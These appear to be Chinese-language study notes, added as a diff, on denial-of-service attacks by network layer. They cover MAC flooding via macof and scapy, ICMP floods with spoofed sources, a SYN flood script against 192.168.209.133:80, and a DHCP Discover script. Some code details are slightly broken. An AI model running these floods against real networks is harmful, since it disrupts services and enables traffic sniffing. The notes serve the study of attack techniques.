@@ -1,0 +1,237 @@
+拒绝服务攻击:
+  定义:故意占用某一服务的有限资源从而导致其无法正常工作的行为
+1:数据链路层的拒绝服务攻击:
+  攻击目标:二层交换机  使其以不正常的方式运行
+    攻击原理:
+      早期网络使用的是一种名为集线器的设备，有一种使用sniffer来监听整个局域网的方法。
+      这种方法极为简单，只需要网卡支持混杂模式即可。多年前局域网进行通信的设备大都是集线器，而现在使用的却是交换机。
+      这两种设备的作用相同，都可以实现局域网两台主机之间的通信，但是工作原理却不同。
+      简单地说，集线器中没有任何的“学习”和“记忆”能力。假设一个局域网中有100台计算机，
+      这些计算机都用网线连接到集线器的网络接口上，其中每一个接口对应一台计算机。
+      当A计算机向B计算机发送数据包时，需要先将数据包发给集线器，由集线器负责转发。
+      可是当集线器收到这个数据包时并不知道哪个接口连接到B计算机，
+      所以集线器会大量地复制这个数据包，然后向所有的接口都发送一份这个数据包的副本。
+      结果局域网中的所有计算机都收到了这个数据包，每台计算机上面的网卡会查看这个数据包上的目的信息，
+      如果该目的并非本机，就会丢弃这个数据包。这样就只有B计算机才会接收并处理这个数据包。
+      但是这种机制并不能确保数据包的保密性，就像之前提到的那样，
+      局域网中的任何一台主机只需要将网卡设置为混杂模式，然后使用抓包软件（例如之前提到的sniffer），
+      就可以捕获网络中的所有通信数据包。目前的局域网中几乎已经见不到集线器的踪影了，取而代之的是交换机。
+      相比于集线器，交换机则多了“记忆”和“学习”的功能。
+      这两个功能是通过交换机中的CAM表实现的，这张表中保存了交换机中每个接口所连接计算机的MAC地址信息，这些信息可以通过动态学习获得。
+      这样当局域网中的A计算机向B计算机发送数据包时，会先将这个数据包发送到交换机，由交换机转发。
+      交换机在收到这个数据包时会提取出数据包的目的MAC地址，并查询CAM表，
+      如果能查找到对应的表项，就将数据包从找到的接口发送出去。如果没有找到，再将数据包向所有接口发送。
+      在转发数据包的时候，交换机还会进行一个学习的过程，交换机会将接收到的数据包中的源MAC地址提取出来，
+      并查询CAM表，如果表中没有这个源MAC地址对应接口的信息，则会将这个数据包中的源MAC地址与收到这个数据包的接口作为新的表项插入CAM表中。
+      交换机的学习是一个动态的过程，每个表项并不是固定的，而是都有一个定时器（通常是5分钟），从这个表项插入CAM表开始起，当该定时器递减到零时，该CAM项就会被删除。
+    由此:
+      由于CAM表的容量是有限的 短时间内收到大量不同源的MAC发来的数据包后会填满 填满后新的MAC地址会取代原来的地址 
+      此时网络中正常的数据到达后找不到对应的MAC地址 就会发送广播数据包 此时交换机退化为集线器 这样开启本机的混杂模式就可以监听整个局域网的通信
+  1.1:使用macof工具完成攻击
+        它是dsniff工具集的一个组件,在kali终端输入macof即可启动
+      用法:
+        macof [-s src] [-d dst] [-e eth] [-x port] [-y dport] [-i interface]  [-n times]
+        在实际应用中,只有参数-i会用到 用来指定发送那些伪造数据包的网卡
+  1.2:使用scapy实现:
+      RandMAC()          构造随机MAC地址
+      RandIP()           构造随机IP地址(也可以生成固定网段的IP地址:RandIP('192.0.0.1.*')
+    python:(随机产生和发送ICMP数据包)
+      from scapy.all import *
+      def send_packet(packet):
+          while True:
+              send(packet,timeout=2)
+              print(packet.summary())
+      if __name__ == '__main__':
+          packet = Ether(src=RandMAC())/IP(src=RandIP(),dst=RandIP())/ICMP()
+          send_packet(packet)
+    python:(随机产生和发送ARP数据包)
+      from scapy.all import *
+      import time
+      
+      
+      def send_packet(packet, interval=1, count=None, iface=None):
+          """安全发送随机MAC数据包
+      
+          :param packet: Scapy 数据包对象
+          :param interval: 发送间隔（秒）
+          :param count: 发送次数，None表示无限
+          :param iface: 指定网卡接口
+          """
+          try:
+              sent = 0
+              while True:
+                  sendp(packet, iface=iface, verbose=0)
+                  print(f"[{sent + 1}] Sent: {packet.summary()}")
+                  time.sleep(interval)  # 关键：控制速率
+                  sent += 1
+                  if count and sent >= count:
+                      break
+          except KeyboardInterrupt:
+              print("\nUser stopped.")
+          except Exception as e:
+              print(f"Error: {e}")
+      
+      
+      if __name__ == '__main__':
+          # 构造合法数据包（示例：包含IP层）
+          packet = Ether(src=RandMAC(), dst=RandMAC()) / \
+                   IP(src=RandIP(), dst="8.8.8.8") / \
+                   ICMP()
+      
+          # 发送配置（需root权限）
+          send_packet(
+              packet,
+              interval=0.5,  # 每0.5秒发一次
+              count=20,  # 发送20次
+              iface="eth0"  # 指定网卡
+          )
+
+2:网络层的拒绝服务攻击
+  2.1:
+    介绍:位于网络层的协议包括ARP、IP和ICMP等，其中ICMP主要用来在IP主机、路由器之间传递控制消息。
+        平时检测网络连通情况时使用的ping命令就是基于ICMP的。
+        个过程遵守ICMP的规定。上面例子中使用的ping命令就是IMCP请求（Type=8），收到的回应是ICMP应答（Type=0），
+        一台主机向一个节点发送一个Type=8的ICMP报文，如果途中没有异常（例如被路由器丢弃、目标不回应ICMP或传输失败),
+        则目标返回Type=0的ICMP报文，说明这台主机存在。
+      但是目标主机在处理这个请求和应答是需要消耗CPU资源的，处理少量的ICMP请求并不会对CPU的运行速度产生影响，
+      但是大量的ICMP请求呢？使用ping命令来尝试一下。这次将ICMP数据包设置得足够大。
+      ping命令发送的数据包大小可以使用-l来指定（这个值一般指定为65500），这样构造好的数据包被称作“死亡之ping”。
+      这是因为早期的系统无法处理这么大的ICMP数据包，在接收到这种数据包之后就会死机。
+      现在的系统则不会出现这种问题，但是可以考虑使用这种方式向目标连续地发送这种“死亡之ping”来消耗目标主机的资源。
+      发送再多的数据包效果也不明显，主要原因是现在的操作系统和CPU完全有能力处理这个数量级的数据包。
+      既然对方能够承受这个速度的数据包，那么拒绝服务攻击也就没有效果了。必须想办法提高发送到目标的数据包的数量。
+      这里主要有两种办法：
+        一是同时使用多台计算机发送ICMP数据包；
+        二是提高发送的ICMP数据包的速度。
+      本机地址不断地向目标发送ICMP包的方法之外，还有两种方法：
+                              一是使用随机地址不断地向目标发送ICMP包；
+                              二是向不同的地址不断发送以攻击目标的IP地址为发送地址的数据包。
+      这种攻击模式里最终淹没目标的洪水不是由攻击者发出的，也不是伪造IP地址发出的，而是正常通信的服务器发出的。
+  2.2:除了前面的RandIP(),还可以使用下面的方法来实现
+        i.src="%i.%i.%i.%i"%(random.randint(1,254),random.randint(1,254),
+                    random.randint(1,254),random.randint(1,254))
+      python完整代码:
+        from time import sleep
+        from scapy.all import *
+        def send_packet(packet, interval=(1, 3), count=100, iface=None):
+            """安全发送ICMP包
+            :param interval: 延迟范围（秒）
+            :param count: 最大发送次数
+            :param iface: 指定网卡
+            """
+            try:
+                for _ in range(count):
+                    delay = random.uniform(*interval)
+                    sleep(delay)
+                    send(packet, iface=iface, verbose=0, timeout=2)
+                    print(f"Sent to {packet[IP].dst} | Delay: {delay:.2f}s")
+            except KeyboardInterrupt:
+                print("\nUser stopped.")
+            except Exception as e:
+                print(f"Error: {e}")
+        if __name__ == '__main__':
+            # 生成合法地址
+            pdst = RandIP()  # 随机公网IP
+            psrc = RandIP("192.168.0.0/16")  # 私有地址
+        
+            # 构造数据包
+            packet = IP(src=psrc, dst=pdst) / ICMP()
+        
+            # 发送配置（需root权限）
+            send_packet(
+                packet,
+                interval=(0.5, 2),  # 延迟范围
+                count=50,  # 最多发50次
+                iface="eth0"  # 指定网卡
+            )
+3:传输层的拒绝服务攻击
+    常说的拒绝服务攻击(DoSA)就是基于TCP的拒绝服务攻击
+  原理:不同于针对ICMP和UDP的DoSA攻击方式 TCP的攻击方式是面向连接的 
+       只需要和目标主机的端口建立大量的TCP连接 就可以让目标主机的链接表被填满 
+       从而不会接受任何新的连接
+  类型:
+      1:和目标完成三次握手 建立一个完整的连接
+	    2:只和目标完成三次握手的前两次(SYN拒绝服务攻击) 第二种是最常见的
+  3.1.下面使用python实现:
+      from time import sleep
+      from scapy.all import *
+      def DoSA_TCP(packet,interval=(0.1,0.5),count=100,iface='eht0'):
+          try:
+              for i in range(1,count+1):
+                  delay = random.uniform(*interval)
+                  sleep(delay)
+                  send(packet,
+                       iface=iface,
+                       verbose=0,
+                       timeout=2)
+                  print(f'[{i}/{count}] Send SYN to {packet[IP].dst}:{packet[TCP].dport} | Delay:{delay}')
+          except KeyboardInterrupt:
+              print('Interrupt')
+          except PermissionError:
+              print('需要以root权限运行')
+          except Exception as e:
+              print(str(e))
+          pass
+      if __name__ == '__main__':
+          psrc = RandIP()
+          pdst = '192.168.209.133'
+          packet = IP(src=psrc,dst=pdst)/TCP(sport=RandShort(),dport=80,flags="s")
+          DoSA_TCP(packet)
+
+4:基于应用层的拒绝服务攻击
+      应用层常见的协议有HTTP,FTP,DNS,DHCP等等,下面以DHCP(动态主机配置协议)演示
+    DHCP作用:通常被应用在大型的局域网络环境中，主要作用是集中管理、分配IP地址，
+             使网络环境中的主机动态地获得IP地址、网关地址、DNS服务器地址等信息，
+             并能够提升地址的使用率。
+    DHCP原理:DHCP采用客户机／服务器模型，主机地址的动态分配任务由网络主机驱动。
+             当DHCP服务器接收到来自网络主机申请地址的信息时，才会向网络主机发送相关的地址配置等信息，
+             以实现网络主机地址信息的动态配置。
+    4.1:下面编写程序搜索DHCP服务器
+        python:
+          from scapy.all import *
+          import random
+          import binascii
+          
+          # 生成合法的32位事务ID
+          xid_random = random.getrandbits(32)
+          
+          # 生成随机MAC并处理chaddr字段
+          mac_random = str(RandMAC())
+          mac_clean = mac_random.replace(':', '')
+          mac_bytes = binascii.unhexlify(mac_clean)
+          client_mac_id = mac_bytes + b'\x00' * 10  # 16字节补零
+          
+          print(f"[+] 生成随机MAC: {mac_random} | 事务ID: {xid_random}")
+          
+          # 构造DHCP Discover包
+          dhcp_discover = (
+              Ether(src=mac_random, dst='ff:ff:ff:ff:ff:ff') /
+              IP(src='0.0.0.0', dst='255.255.255.255') /
+              UDP(sport=68, dport=67) /
+              BOOTP(
+                  chaddr=client_mac_id,
+                  xid=xid_random,
+                  flags=0x8000  # 广播标志
+              ) /
+              DHCP(options=[
+                  ("message-type", 1),  # 1=Discover
+                  ("param_req_list", [1, 3, 6, 15, 31, 33]),  # 请求子网/路由/DNS等参数
+                  "end"
+              ])
+          )
+          
+          # 发送数据包（需root权限）
+          try:
+              sendp(dhcp_discover, 
+                    iface="以太网",  # 需根据系统修改（如"eth0"/"Wi-Fi"）
+                    verbose=0,
+                    count=3,  # 发送3次
+                    inter=1   # 间隔1秒
+                   )
+              print(f"\n[+] 已在接口 以太网 发送DHCP Discover包")
+          except Exception as e:
+              print(f"[!] 发送失败: {str(e)}")
+
+    
+      
+  
